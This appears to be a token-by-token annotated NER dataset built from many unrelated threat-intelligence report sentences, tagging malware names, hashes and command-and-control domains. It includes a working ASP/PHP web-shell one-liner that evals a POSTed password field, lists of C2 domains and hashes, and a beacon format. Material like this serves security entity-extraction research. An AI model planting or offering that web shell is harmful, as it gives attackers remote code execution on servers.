–	O
a	O
subdomain	O
enumeration	O
tool	O
available	O
for	O
Python	O
and	O
Windows	O
that	O
uses	O
an	O
open	O
name	O
resolver	O
as	O
a	O
proxy	O
and	O
does	O
not	O
send	O
traffic	O
to	O
the	O
target	O
DNS	O
server	O
.	O

<	O
%	O
@	O
Page	O
Language='Jscript	O
'	O
%	O
>	O
<	O
%	O
eval	O
(	O
RequestItem	O
[	O
'	O
password	O
'	O
]	O
,	O
'	O
unsafe	O
'	O
)	O
;	O
%	O
>	O
<	O
?	O
php	O
@	O
eval	O
(	O
$	O
_POST	O
[	O
'	O
password	O
'	O
]	O
)	O
;	O
?	O

The	O
analysed	O
sample	O
allows	O
a	O
glimpse	O
into	O
the	O
toolkit	O
of	O
one	O
of	O
the	O
team	O
in	O
well-planned	O
bank	O
heist	O
.	O

These	O
malicious	O
documents	O
were	O
used	O
by	O
the	O
developer	O
to	O
run	O
several	O
tests	O
on	O
the	O
popular	O
analysis	O
platform	O
VirusTotal	O
.	O

4QtgfoP	O
mbojnXS	O
mbojnXS	O

'	O
Xagent	O
'	O
is	O
the	O
original	O
filename	O
Xagent	O
<	O
VER	O
>	O
.exe	O
whereas	O
<	O
VER	O
>	O
seems	O
to	O
be	O
the	O
version	O
of	O
the	O
worm	O
.	O

For	O
example	O
,	O
the	O
key	O
'	O
'	O
is	O
12	O
bytes	O
long	O
,	O
but	O
the	O
length	O
is	O
calculated	O
as	O
only	O
being	O
6	O
bytes	O
long	O
.	O

The	O
likely	O
use	O
of	O
social	O
engineering	O
to	O
recruit	O
devices	O
serves	O
as	O
a	O
reminder	O
that	O
users	O
need	O
to	O
be	O
wary	O
of	O
clicking	O
on	O
unsolicited	O
links	O
and	O
verify	O
identities	O
and	O
legitimacy	O
of	O
requests	O
to	O
access	O
devices	O
.	O

There	O
could	O
be	O
many	O
iterations	O
of	O
netsat.exe	B-malware.infosteal
running	O
on	O
enterprise	O
or	O
targeted	O
entity	O
systems	O
.	O

Leaked	O
emails	O
published	O
by	O
Kazaword	O
allege	O
that	O
the	O
government	O
of	O
Kazakhstan	O
had	O
previously	O
hired	O
a	O
private	O
intelligence	O
company	O
known	O
as	O
Arcanum	O
to	O
perform	O
a	O
surveillance	O
and	O
data	O
extraction	O
mission	O
(	O
codenamed	O
'	O
Raptor	O
)	O
targeting	O
Mr	O
.	O

Participants	O
will	O
not	O
only	O
receive	O
DHS-developed	O
indicators	O
,	O
but	O
can	O
share	O
indicators	O
they	O
have	O
observed	O
in	O
their	O
own	O
network	O
defense	O
efforts	O
,	O
which	O
DHS	O
will	O
then	O
share	O
with	O
all	O
AIS	O
participants	O
.	O

The	O
amount	O
wiped	O
from	O
the	O
host	O
will	O
never	O
be	O
the	O
same	O
from	O
system	O
to	O
system	O
,	O
mainly	O
because	O
the	O
size	O
of	O
the	O
disk	O
and	O
partitions	O
will	O
all	O
need	O
to	O
be	O
taken	O
into	O
account	O
.	O

NBC	O
News	O
.	O

It	O
is	O
assumed	O
that	O
previous	O
reconnaissance	O
was	O
conducted	O
by	O
the	O
actors	O
on	O
the	O
internal	O
network	O
to	O
identify	O
active	O
and	O
responding	O
devices	O
,	O
as	O
well	O
as	O
capturing	O
admin	O
credentials	O
for	O
the	O
network	O
.	O

The	O
Cmstar	B-malware.unknown
downloader	O
starts	O
by	O
manually	O
building	O
its	O
import	O
address	O
table	O
(	O
IAT	O
)	O
,	O
much	O
like	O
shellcode	O
would	O
;	O
however	O
,	O
it	O
uses	O
a	O
rather	O
unique	O
technique	O
.	O

Please	O
contact	O
research	O
at	O
fireeye	O
dot	O
com	O
for	O
more	O
information	O
.	O

The	O
results	O
of	O
this	O
post	O
con rm	O
the	O
assumption	O
of	O
the	O
Usenix	O
paper	O
,	O
also	O
based	O
on	O
a	O
dataset	O
of	O
a	O
big	O
security	O
company	O
and	O
similar	O
results	O
are	O
expected	O
throughout	O
the	O
security	O
industry	O
.	O

DaysOfLife	O
:	O
00000000	O
DWORD	O

Is	O
this	O
a	O
Windows­only	O
threat	O
?	O

'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
is	O
only	O
the	O
first	O
stage	O
in	O
this	O
attack	O
and	O
can	O
be	O
seen	O
as	O
reconnaissance	O
tool	O
.	O

What	O
differs	O
is	O
that	O
the	O
packets	O
exchanged	O
between	O
the	O
client	O
and	O
the	O
server	O
begin	O
with	O
a	O
plaintext	O
header	O
'	O
Spidern	O
'	O
,	O
followed	O
by	O
the	O
data	O
packet	O
that	O
is	O
compressed	O
using	O
zlib	O
.	O

4dc22c1695d1f275c3b6e503a1b171f5	O
111ed2f02d8af54d0b982d8c9dd4932e	O
7731d42b043865559258464fe1c98513	O
24b354f8cfb6a181906ceaf9a7ec28b0	O
fdba4370b60eda1ee852c6515da9da58	O
3ab3d463575a011dfad630da154600b5	O
a347af5cc3c5429911e5167b2d30e1ac	O
6b207521c9175d2274ba3debcc700a1d	O
cb264c9efa566f41975a3cebf903efb5	O
e9c0d32a15a24b1110fcc18ab04a6738	O
d102e873971aa4190a809039bc789e4d	O
d7ca9cf72753df7392bfeea834bcf992	O
-	O
dropped	O
by	O
the	O
Java	O
CVE-2012-1723	O
exploits	O
42b7b0bd4795fc8e336e1f145fc2d27c	O
ab686acde338c67bec8ab42519714273	O
8e90d8b68a053d22b54fb39f1cf01a41	O
d22b0ec4e9b2302c07f38c835a78148a	O
764d643e5cdf3b8d4a04b50d0bc44660	O
d31f1d873fa3591c027b54c2aa76a52b	O
ea1c266eec718323265c16b1fdc92dac	O
bc2eff0a1544e74462e7377cf0de5a36	O
d22b0ec4e9b2302c07f38c835a78148a	O
86f28e8d9d6bda11abcf93b76074b311	O
d28661163ae91848e01a733836bfe0aa	O
09b7f890ccded1a6210119df8a9a08f9	O
5c4a51ce7aa76579616a01a0a3cfab38	O
aa58167c57cac1bc562c77766ca249f5	O
3a785ede87bfbd2c1c29887e9c36c801	O
7731d42b043865559258464fe1c98513	O
0e441602449856e57d1105496023f458	O

The	O
ZxShell	B-malware.backdoor
hook	O
code	O
knows	O
that	O
and	O
intercept	O
ObReferenceObjectByHandle	O
is	O
a	O
Kernel	O
routine	O
designed	O
to	O
validate	O
a	O
target	O
object	O
and	O
return	O
the	O
pointer	O
to	O
its	O
object	O
body	O
(	O
and	O
even	O
its	O
handle	O
information	O
)	O
,	O
starting	O
from	O
the	O
object	O
handle	O
(	O
even	O
the	O
user-mode	O
one	O
)	O
.	O

Figure	O
4	O
.	O

For	O
example	O
,	O
APT32	B-malware.infosteal
installed	O
one	O
backdoor	O
as	O
a	O
persistent	O
service	O
with	O
a	O
legitimate	O
service	O
name	O
that	O
had	O
a	O
Unicode	O
no-break	O
space	O
character	O
appended	O
to	O
it	O
.	O

The	O
IPs	O
only	O
contained	O
the	O
first	O
3	O
octets	O
,	O
and	O
would	O
have	O
been	O
used	O
to	O
filter	O
traffic	O
such	O
that	O
only	O
IPs	O
on	O
that	O
subnet	O
would	O
be	O
delivered	O
the	O
exploit	O
and	O
payload	O
.	O

Figure	O
5	O
.	O

We	O
noted	O
the	O
developer	O
repeatedly	O
uploading	O
the	O
modified	O
versions	O
to	O
VirusTotal	B-url.normal
,	O
presumably	O
in	O
an	O
attempt	O
to	O
improve	O
evasion	O
of	O
anti-virus	O
.	O

post	O
]	O

At	O
this	O
time	O
,	O
there	O
is	O
very	O
little	O
available	O
in	O
terms	O
of	O
attribution	O
.	O

Each	O
step	O
of	O
the	O
enrollment	O
process	O
needs	O
some	O
type	O
of	O
user	O
interaction	O
.	O

988babfeec5111d45d7d7eddea6daf28	B-hash
ABRIL	O
CmetaS3	O

The	O
malware	O
sample	O
was	O
reverse	O
engineered	O
in	O
an	O
isolated	O
environment	O
(	O
without	O
actually	O
allowing	O
it	O
to	O
connect	O
to	O
the	O
c2	O
server	O
)	O
.	O

When	O
updated	O
with	O
this	O
information	O
the	O
plot	O
now	O
looks	O
like	O
this	O
:	O

Figure	O
12	O
.	O

The	O
watchdog	O
thread	O
checks	O
the	O
registry	O
path	O
of	O
the	O
ZxShell	B-malware.backdoor
service	O
every	O
2	O
seconds	O
,	O
to	O
verify	O
that	O
it	O
has	O
n't	O
been	O
modified	O
.	O

No	O
other	O
changes	O
are	O
made	O
to	O
the	O
system	O
.	O

The	O
payload	O
includes	O
an	O
encrypted	O
configuration	O
block	O
which	O
contains	O
information	O
about	O
the	O
C	O
&	O
C	O
sever	O
:	O
The	O
information	O
from	O
the	O
config	O
includes	O
a	O
WebDAV	O
URL	O
which	O
is	O
used	O
for	O
connections	O
,	O
a	O
username	O
and	O
password	O
,	O
two	O
folders	O
on	O
the	O
WebDAV	O
server	O
used	O
to	O
store	O
plugins/modules	O
for	O
the	O
malware	O
and	O
where	O
data	O
from	O
the	O
victim	O
should	O
be	O
uploaded	O
.	O

In	O
addition	O
to	O
the	O
four	O
clusters	O
outlined	O
above	O
,	O
within	O
the	O
24	O
additional	O
compromises	O
identified	O
,	O
we	O
believe	O
there	O
are	O
at	O
least	O
3	O
other	O
distinct	O
groups	O
using	O
the	O
framework	O
.	O

This	O
assessment	O
was	O
performed	O
with	O
HBGary	O
ResponderTM	O
.	O

The	O
data	O
within	O
the	O
POST	O
stub	O
is	O
constructed	O
in	O
a	O
buffer	O
with	O
a	O
header	O
at	O
offset	O
0	O
(	O
\	O
x30\x30	O
)	O
followed	O
by	O
the	O
remote	O
sever	O
,	O
remote	O
port	O
,	O
XOR	O
encrypted	O
data	O
and	O
function	O
call	O
location	O
.	O

[	O
그림	O
2	O
]	O
2015년	O
공격에	O
사용된	O
문서	O
2017년	O
이후	O
발견된	O
문서는	O
[	O
그림	O
3	O
]	O
과	O
같이	O
문서	O
본문을	O
보는데	O
이상이	O
있는	O
것처럼	O
흐릿하게	O
위장함으로	O
써	O
수신자의	O
매크로	O
활성화를	O
유도하고	O
있다	O
.	O

The	O
file	O
is	O
located	O
in	O
Babar	O
's	O
working	O
directory	O
and	O
named	O
update.msi	O
.	O

Encrypted	O
DLLs	O
,	O
thereby	O
avoiding	O
detection	O
by	O
common	O
anti-virus	O
and	O
sandboxing	O
systems	O
because	O
they	O
're	O
unable	O
to	O
analyze	O
encrypted	O
files	O
.	O

Specific	O
targets	O
include	O
staff	O
working	O
for	O
or	O
associated	O
with	O
Hillary	O
Clinton	O
's	O
presidential	O
campaign	O
and	O
the	O
Democratic	O
National	O
Committee	O
(	O
DNC	O
)	O
,	O
including	O
individuals	O
managing	O
Clinton	O
's	O
communications	O
,	O
travel	O
,	O
campaign	O
finances	O
,	O
and	O
advising	O
her	O
on	O
policy	O
.	O

The	O
left	O
is	O
sample	O
module	O
1	O
,	O
while	O
the	O
right	O
is	O
the	O
module	O
generated	O
by	O
Beacon	O
.	O

06d5dddd4c349f666d84a91d6edc4f8d	B-hash
msdsp.dll	O
Thanks	O
to	O
Darien	O
Kindlund	O
for	O
his	O
assistance	O
in	O
research	O
.	O

From	O
the	O
emails	O
(	O
and	O
the	O
attachments	O
)	O
it	O
looks	O
like	O
the	O
goal	O
of	O
the	O
attackers	O
was	O
to	O
infect	O
and	O
take	O
control	O
of	O
the	O
systems	O
and	O
also	O
to	O
spy	O
on	O
the	O
actions	O
of	O
the	O
Indian	O
Government	O
post	O
the	O
Jammu	O
&	O
Kashmir	O
protest	O
and	O
Uri	O
Terror	O
attack	O
.	O

Copyright	O
2016	O

ZwQueryInformationProcess	O
is	O
also	O
called	O
to	O
check	O
the	O
DEP	O
status	O
on	O
the	O
current	O
process	O
,	O
and	O
it	O
disables	O
it	O
if	O
it	O
's	O
found	O
to	O
be	O
enabled	O
.	O

This	O
implant	O
has	O
the	O
following	O
beacon	O
format	O
:	O
GET	O
/el/sregister.php?name=	O
[	O
REDACTED	O
]	O
HTTP/1.1	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
10.0	O
;	O
Windows	O
NT	O
6.1	O
;	O
Trident/6.0	O
)	O
Host	O
:	O
122.10.62.137	B-url.normal
Connection	O
:	O
Keep-Alive	O
Other	O
URI	O
formats	O
include	O
:	O
/el/slogin.php?uid=	O
/el/suploadfile.php?item=	O
/el/suploadfile.php	O
FireEye	O
has	O
previously	O
analyzed	O
this	O
backdoor	O
11	O
,	O
which	O
is	O
used	O
by	O
multiple	O
other	O
groups	O
in	O
addition	O
to	O
DragonOK	B-malware.infosteal
and	O
Moafee	B-malware.infosteal
.	O

Figure	O
12	O
:	O
Malware	O
Capturing	O
Mouse	O
Clicks	O

In	O
addition	O
to	O
implementing	O
both	O
mitigation	O
techniques	O
and	O
proactive	O
strategies	O
,	O
organizations	O
can	O
also	O
strengthen	O
their	O
security	O
by	O
employing	O
solutions	O
such	O
Trend	O
MicroTM	O
Deep	O
SecurityTM	O
,	O
Vulnerability	O
Protection	O
,	O
and	O
TippingPoint	O
,	O
which	O
protects	O
endpoints	O
from	O
threats	O
that	O
abuse	O
vulnerabilities	O
.	O

In	O
late	O
July	O
2012	O
,	O
we	O
published	O
the	O
results	O
of	O
an	O
investigation	O
into	O
a	O
suspicious	O
e-mail	O
campaign	O
targeting	O
Bahraini	O
activists	O
.	O

ShadowTech	B-malware.backdoor
RAT	I-malware.backdoor
control	O
console	O
:	O

Currently	O
,	O
the	O
malware	O
used	O
by	O
EvilGrab	B-malware.drop
belongs	O
to	O
one	O
of	O
three	O
malware	O
families	O
:	O
BKDR_HGDER	B-malware.backdoor
BKDR_EVILOGE	B-malware.backdoor
BKDR_NVICM	B-malware.backdoor

According	O
to	O
our	O
technical	O
analysis	O
,	O
the	O
attackers	O
were	O
interested	O
in	O
targeting	O
following	O
organizations	O
'	O
.	O

That	O
means	O
adversaries	O
can	O
only	O
use	O
an	O
attack	O
once	O
,	O
which	O
increases	O
their	O
costs	O
and	O
ultimately	O
reduces	O
the	O
prevalence	O
of	O
cyber-attacks	O
.	O

When	O
decoded	O
,	O
we	O
can	O
see	O
that	O
it	O
follows	O
the	O
same	O
data	O
structure	O
as	O
the	O
initial	O
message	O
.	O

Foreign	O
governments	O
already	O
use	O
some	O
of	O
these	O
tools	O
to	O
target	O
U.S.	O
systems	O
.	O
'	O

It	O
allocates	O
a	O
buffer	O
of	O
0x2800	O
bytes	O
and	O
copies	O
the	O
code	O
for	O
the	O
ZxGetLibAndProcAddr	O
function	O
.	O

For	O
this	O
reason	O
we	O
believe	O
both	O
groups	O
are	O
targets	O
of	O
Operation	B-malware.ransom
Manul	I-malware.ransom
.	O

The	O
goal	O
of	O
the	O
CRR	O
is	O
to	O
develop	O
an	O
understanding	O
and	O
measurement	O
of	O
key	O
cybersecurity	O
capabilities	O
to	O
provide	O
meaningful	O
indicators	O
of	O
an	O
entity	O
's	O
operational	O
resilience	O
and	O
ability	O
to	O
manage	O
cyber	O
risk	O
to	O
critical	O
services	O
during	O
normal	O
operations	O
and	O
times	O
of	O
operational	O
stress	O
and	O
crisis	O
.	O

To	O
specifically	O
counter	O
IRONGATE	B-malware.backdoor
's	O
process	O
attack	O
techniques	O
,	O
ICS	O
asset	O
owners	O
may	O
,	O
over	O
the	O
longer	O
term	O
,	O
implement	O
solutions	O
that	O
:	O
Require	O
integrity	O
checks	O
and	O
code	O
signing	O
for	O
vendor	O
and	O
user	O
generated	O
code	O
.	O

Between	O
July	O
and	O
August	O
2014	O
,	O
Russian	O
backed	O
forces	O
launched	O
some	O
of	O
the	O
most	O
decisive	O
attacks	O
against	O
Ukrainian	O
forces	O
,	O
resulting	O
in	O
significant	O
loss	O
of	O
life	O
,	O
weaponry	O
,	O
and	O
territory	O
.	O

Reflective	O
DLL	O
Injection	O
,	O
an	O
advanced	O
technique	O
for	O
injecting	O
malware	O
that	O
was	O
also	O
used	O
by	O
BlackEnergy	B-malware.unknown
in	O
the	O
Ukrainian	O
grid	O
attacks	O
and	O
by	O
Duqu	B-malware.infosteal
in	O
the	O
Stuxnet	B-malware.backdoor
attacks	O
on	O
Iranian	O
nuclear	O
facilities	O
.	O

POST	O
Body	O
for	O
Hello	O
Message	O
agent_id	O
module_id	O
cmd_id	O
data	O
data_size	O
priority	O

The	O
'	O
DragonOK	B-malware.infosteal
'	O
group	O
in	O
particular	O
is	O
known	O
to	O
use	O
password-protected	O
documents	O
delivered	O
as	O
attachments	O
in	O
emails	O
,	O
with	O
the	O
password	O
listed	O
in	O
the	O
contents	O
of	O
the	O
email	O
.	O

This	O
write-up	O
will	O
survey	O
notables	O
in	O
the	O
past	O
year	O
of	O
2017	O
Sofacy	O
activity	O
,	O
including	O
their	O
targeting	O
,	O
technology	O
,	O
and	O
notes	O
on	O
their	O
infrastructure	O
.	O

The	O
launch	O
point	O
was	O
a	O
South	O
Korean	O
software	O
company	O
's	O
update	O
server	O
,	O
normally	O
used	O
to	O
deliver	O
software	O
updates	O
to	O
customers.The	O
attackers	O
compromised	O
the	O
server	O
and	O
created	O
a	O
Trojan	O
that	O
would	O
be	O
downloaded	O
to	O
user	O
computers	O
during	O
a	O
routine	O
update	O
.	O

VBS	O
and	O
PowerShell-based	O
loaders	O

In	O
particular	O
,	O
one	O
strong	O
clue	O
is	O
that	O
the	O
(	O
assumed	O
)	O
decryption	O
step	O
takes	O
a	O
third	O
argument	O
which	O
,	O
in	O
this	O
case	O
,	O
is	O
a	O
reference	O
to	O
a	O
global	O
string	O
-	O
very	O
likely	O
to	O
be	O
the	O
decryption	O
key	O
string	O
!	O

Encrypted	O
configuration	O
file	O
CozyDuke	B-malware.drop
components	O

We	O
do	O
not	O
speculate	O
on	O
attribution	O
.	O

In	O
this	O
case	O
,	O
the	O
binary	O
abused	O
is	O
a	O
legitimate	O
Windows	O
tool	O
,	O
Certmgr.exe	O
,	O
that	O
loads	O
Cryptui.dll	O
.	O

In	O
October	O
2014	O
,	O
FireEye	O
released	O
APT28	B-malware.infosteal
:	O
A	O
Window	O
into	O
Russia	O
's	O
Cyber	O
Espionage	O
Operations	O
?	O
,	O
and	O
characterized	O
APT28	B-malware.infosteal
's	O
activity	O
as	O
aligning	O
with	O
the	O
Russian	O
Government	O
's	O
strategic	O
intelligence	O
requirements	O
.	O

Subject	O
:	O
Thank	O
you	O
Subject	O
:	O
FW	O
:	O
URGENT	O
CONFIRMATION	O
P/I	O
#	O
94578	O
Subject	O
:	O
Invitation	O
Subject	O
:	O
Payment	O
details	O
Subject	O
:	O
Transfer	O
Investigation	O
report	O
Subject	O
:	O
Subject	O
:	O
US	O
$	O
25,000	O
TT	O
COPY	O
ATTACHED	O
Remittance	O
Error	O
2089/234-	O
Reported	O
lost	O
of	O
data	O
(	O
Complete	O
and	O
email	O
back	O
)	O
Subject	O
:	O
Transfer	O
error	O
,	O
kindly	O
reverse	O
to	O
us	O
.	O

SHA-1	O
SHA-256	O
File	O
Size	O
Icon	O
dc40f11eb6815ca9adea0a3b8ce7262c	B-hash
31875868738792a258c2b38641acf2aac1ac0352	B-hash
87bffb0370c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef	B-hash
851.07	O
KB	O

Judging	O
from	O
the	O
module	O
strings	O
and	O
the	O
system	O
functions	O
,	O
the	O
module	O
belongs	O
to	O
backdoor	O
program	O
that	O
can	O
send	O
GET	O
request	O
to	O
designated	O
addresses	O
and	O
heartbeat	O
packages	O
by	O
using	O
Cookie	O
fields	O
with	O
60	O
seconds	O
'	O
interval	O
.	O

It	O
simply	O
opens	O
a	O
pop-up	O
to	O
the	O
user	O
confirming	O
the	O
execution	O
of	O
the	O
dynamic	O
library	O
.	O

Figure	O
8	O
:	O
Remote	O
shell	O
|	O
Adding	O
admin	O
user	O
|	O
Connected	O
to	O

Of	O
note	O
,	O
on	O
several	O
occasions	O
,	O
we	O
have	O
observed	O
evidence	O
of	O
long	O
term	O
intrusions	O
into	O
ICS	O
which	O
were	O
not	O
ultimately	O
used	O
to	O
disrupt	O
or	O
disable	O
operations	O
.	O

The	O
reproduction	O
and	O
distribution	O
of	O
this	O
material	O
is	O
forbidden	O
without	O
express	O
written	O
permission	O
from	O
iDefense	O
.	O

4	O
)	O
Memory	O
Usage	O
Figure	O
9	O
The	O
malware	O
is	O
fairly	O
noisy	O
sending	O
multiple	O
GET	O
requests	O
.	O

(	O
tool	O
descriptions	O
are	O
provided	O
below	O
)	O
.	O

Lures	O

This	O
controller	O
application	O
allows	O
the	O
attacker	O
to	O
manage	O
all	O
of	O
their	O
JRat	B-malware.backdoor
instances	O
and	O
view	O
uptime	O
,	O
operating	O
system	O
,	O
and	O
other	O
information	O
about	O
all	O
infected	O
hosts	O
.	O

generally	O
means	O
that	O
the	O
information	O
's	O
credibility	O
and/or	O
plausibility	O
is	O
questionable	O
,	O
or	O
that	O
the	O
information	O
is	O
too	O
fragmented	O
or	O
poorly	O
corroborated	O
to	O
make	O
solid	O
analytic	O
inferences	O
,	O
or	O
that	O
[	O
there	O
are	O
]	O
significant	O
concerns	O
or	O
problems	O
with	O
the	O
sources	O
.	O

Therefore	O
,	O
we	O
can	O
see	O
that	O
the	O
'	O
leading	O
file	O
'	O
can	O
be	O
regarded	O
as	O
the	O
leading	O
part	O
of	O
attack	O
.	O

All	O
output	O
is	O
sent	O
to	O
standard	O
output	O
(	O
stdout	O
)	O
back	O
to	O
the	O
attacker	O
,	O
which	O
creates	O
the	O
following	O
response	O
to	O
the	O
whoami	O
command	O
and	O
the	O
present	O
working	O
directory	O
:	O

MNAC	O
2.x	O
Under	O
analysis	O
McAfee	O
Remediation	O
Remediation	O
Manager	O
provides	O
mitigation	O
for	O
this	O
issue	O
by	O
elevating	O
Internet	O
Explorer	O
settings	O
in	O
the	O
Internet	O
and	O
Local	O
Intranet	O
zones	O
.	O

The	O
attackers	O
referred	O
to	O
as	O
APT12	O
(	O
also	O
known	O
as	O
IXESHE	O
,	O
DynCalc	O
,	O
and	O
DNSCALC	O
)	O
recently	O
started	O
a	O
new	O
campaign	O
targeting	O
organizations	O
in	O
Japan	O
and	O
Taiwan	O
.	O

Although	O
publicly	O
available	O
RATs	B-malware.backdoor
are	O
used	O
by	O
a	O
variety	O
of	O
operators	O
with	O
different	O
intents	O
,	O
the	O
activity	O
of	O
particular	O
threat	O
actors	O
can	O
still	O
be	O
tracked	O
by	O
clustering	O
command	O
and	O
control	O
server	O
information	O
as	O
well	O
as	O
the	O
information	O
that	O
is	O
set	O
by	O
the	O
operators	O
in	O
the	O
builder	O
.	O

There	O
is	O
much	O
understated	O
activity	O
that	O
can	O
be	O
clustered	O
within	O
this	O
set	O
and	O
overlap	O
in	O
APT	O
activity	O
.	O

The	O
next	O
CozyDuke	B-malware.drop
main	O
component	O
we	O
observed	O
was	O
compiled	O
on	O
the	O
30	O
of	O
November	O
,	O
2012	O
.	O

Meanwhile	O
,	O
the	O
runHandle	O
method	O
of	O
the	O
main	O
backdoor	O
loop	O
will	O
call	O
for	O
the	O
requestServer	O
method	O
with	O
the	O
following	O
backdoor	O
commands	O
(	O
each	O
command	O
has	O
one	O
byte	O
long	O
code	O
and	O
is	O
extracted	O

©	O
AhnLab	O
,	O
Inc	O
.	O

While	O
these	O
IP	O
addresses	O
were	O
in	O
ranges	O
assigned	O
to	O
40	O
distinct	O
countries	O
,	O
the	O
vast	O
majority	O
of	O
the	O
connections	O
to	O
the	O
sinkhole	O
(	O
92.7	O
percent	O
)	O
were	O
from	O
Colombia	O
.	O

This	O
way	O
the	O
malware	O
reduces	O
forensic	O
artefacts	O
,	O
staying	O
behind	O
after	O
infection	O
.	O

Both	O
files	O
are	O
found	O
within	O
the	O
Java	O
Archives	O
files	O
.	O

29	O
Dec	O
.	O

miner	O
:	O
Holds	O
payload	O
URL	O
,	O
as	O
mentioned	O
above	O
(	O
IronStealer	B-malware.infosteal
)	O
.	O

They	O
set	O
up	O
a	O
domain	O
name	O
(	O
ralrab[.]com	B-url.normal
)	O
mimicking	O
the	O
legitimate	O
WinRAR	O
distribution	O
site	O
(	O
rarlab[.]com	B-url.normal
)	O
,	O
and	O
then	O
placed	O
links	O
on	O
a	O
legitimate	O
'	O
certified	O
distributor	O
'	O
site	O
in	O
Europe	O
to	O
redirect	O
to	O
their	O
poisoned	O
installers	O
hosted	O
on	O
ralrab[.]com	B-url.normal
.	O

Directory	O
listing	O
of	O
available	O
logical	O
drives	O
and	O
of	O
the	O
directories	O
:	O

it	O
assumes	O
that	O
C2	O
is	O
not	O
alive	O
or	O
it	O
is	O
connecting	O
to	O
the	O
wrong	O
C2	O
server	O
.	O

CopyKittens	B-malware.backdoor
has	O
conducted	O
at	O
least	O
three	O
waves	O
of	O
cyber-attacks	O
in	O
the	O
past	O
year	O
.	O

may2008.dyndns.info	B-url.cncsvr
menu.dyndns.biz	B-url.cncsvr
flashsoft.no-ip.biz	B-url.cncsvr
monagameel.chickenkiller.com	B-url.cncsvr
hatamaya.chickenkiller.com	B-url.cncsvr
powerhost.zapto.org	B-url.cncsvr
helpme.no-ip.biz	B-url.cncsvr
mjed10.no-ip.info	B-url.cncsvr
good.zapto.org	B-url.cncsvr
hint.zapto.org	B-url.cncsvr
hint1.zapto.org	B-url.cncsvr
natco1.no-ip.net	B-url.cncsvr
natco2.no-ip.net	B-url.cncsvr
natco3.no-ip.net	B-url.cncsvr
natco4.no-ip.net	B-url.cncsvr
loading.myftp.org	B-url.cncsvr
skype.servemp3.com	B-url.cncsvr
test.cable-modem.org	B-url.cncsvr
idf.blogsite.org	B-url.cncsvr
javaupdate.no-ip.info	B-url.cncsvr
lokia.mine.nu	B-url.cncsvr
www.hint-sms.com	B-url.cncsvr
owner.no-ip.biz	B-url.cncsvr
remoteback.no-ip.biz	B-url.cncsvr
ramadi.no-ip.biz	B-url.cncsvr
The	O
likelihood	O
that	O
there	O
are	O
more	O
names	O
involved	O
is	O
large	O
.	O

COZY	O
BEAR	O
(	O
also	O
referred	O
to	O
in	O
some	O
industry	O
reports	O
as	O
CozyDuke	B-malware.backdoor
or	O
APT	O
29	O
)	O
is	O
the	O
adversary	O
group	O
that	O
last	O
year	O
successfully	O
infiltrated	O
the	O
unclassified	O
networks	O
of	O
the	O
White	O
House	O
,	O
State	O
Department	O
,	O
and	O
US	O
Joint	O
Chiefs	O
of	O
Staff	O
.	O

分享奇虎	O
360	O
公司的技术	O
,	O
与安全的互联网共同成长。	O
专栏推荐	O

Highly	O
targeted	O
attacks	O
refer	O
to	O
a	O
category	O
of	O
threats	O
that	O
pertain	O
to	O
intrusions	O
by	O
threat	O
actors	O
or	O
attackers	O
.	O

The	O
DLL	O
dropped	O
by	O
Babar	B-malware.drop
is	O
placed	O
into	O
the	O
application	O
data	O
folder	O
,	O
along	O
with	O
a	O
directory	O
named	O
'	O
MSI	O
'	O
where	O
the	O
runtime	O
data	O
will	O
be	O
stored	O
.	O

<	O
code	O
listed	O
above	O
>	O
Download	O
URL	O
present	O
in	O
internet	O
history	O
during	O
memory	O
analysis	O
.	O

IP	O
Address	O
of	O
people.dohabayt[.]com	O
shared	O
hosting	O
provider	O
(	O
abelons[.]com	B-url.cncsvr
)	O
hosting	O
payloads	O
for	O
exploit	O
chain	O
.	O

APRIL	O
–	O
SEPTEMBER	O
2016	O

upnphost.exe	O

iDefense	O
is	O
providing	O
information	O
about	O
this	O
reported	O
campaign	O
to	O
the	O
general	O
iDefense	O
customer	O
base	O
so	O
that	O
customers	O
are	O
aware	O
of	O
the	O
modus	O
operandi	O
of	O
a	O
highly	O
active	O
threat	O
group	O
that	O
is	O
targeting	O
institutions	O
for	O
espionage	O
purposes	O
,	O
especially	O
in	O
Japan	O
.	O

The	O
email	O
was	O
made	O
to	O
look	O
like	O
it	O
was	O
sent	O
by	O
a	O
General	O
service	O
manager	O
of	O
Hidrofersa	O
enquiring	O
about	O
the	O
product	O
delivery	O
schedule	O
.	O

The	O
headquarters	O
component	O
infects	O
drives	O
connected	O
to	O
its	O
host	O
system	O
with	O
the	O
field	O
unit	O
component	O
and	O
retrieves	O
data	O
from	O
the	O
field	O
unit	O
on	O
the	O
infected	O
drive	O
's	O
return	O
to	O
the	O
headquarters	O
host	O
system	O
.	O

[	O
0x58,0x59,0x5a,0x5b	O
]	O
[	O
0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57	O
]	O
[	O
0x90,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48	O
,	O
0xc8	O
:	O
0x49,0x4a,0x4b	O
]	O

Targeting	O
included	O
TR	O
,	O
KZ	O
,	O
AM	O
,	O
KG	O
,	O
JO	O
,	O
UK	O
,	O
UZ	O
Since	O
mid-November	O
2015	O
,	O
the	O
threat	O
actor	O
referred	O
to	O
as	O
'	O
Sofacy	O
'	O
or	O
'	O
APT28	O
'	O
has	O
been	O
utilizing	O
a	O
unique	O
payload	O
and	O
delivery	O
mechanism	O
written	O
in	O
Delphi	O
and	O
AutoIT	O
.	O

Chafer	O
has	O
used	O
these	O
tools	O
in	O
concert	O
to	O
traverse	O
targeted	O
networks	O
.	O

It	O
checks	O
for	O
many	O
popular	O
virtual	O
environments	O
and	O
automatic	O
analysis	O
systems	O
that	O
are	O
used	O
for	O
malware	O
analysis	O
,	O
including	O
VMware	O
,	O
Virtualbox	O
and	O
Cuckoo	O
Sandbox	O
It	O
checks	O
for	O
popular	O
dynamic	O
analysis	O
tools	O
like	O
PIN	O
tool	O
,	O
DynamoRIO	O
and	O
other	O
emulators	O
.	O

The	O
junk	O
code	O
is	O
pretty	O
easy	O
to	O
spot	O
and	O
once	O
the	O
scheme	O
is	O
known	O
,	O
it	O
can	O
be	O
ignored	O
when	O
analysing	O
the	O
samples	O
.	O

Web	O
.	O

We	O
urge	O
civil	O
society	O
groups	O
and	O
journalists	O
to	O
follow	O
up	O
on	O
our	O
findings	O
within	O
affected	O
countries	O
.	O

On	O
the	O
other	O
hand	O
,	O
Office	O
still	O
supports	O
embedded	O
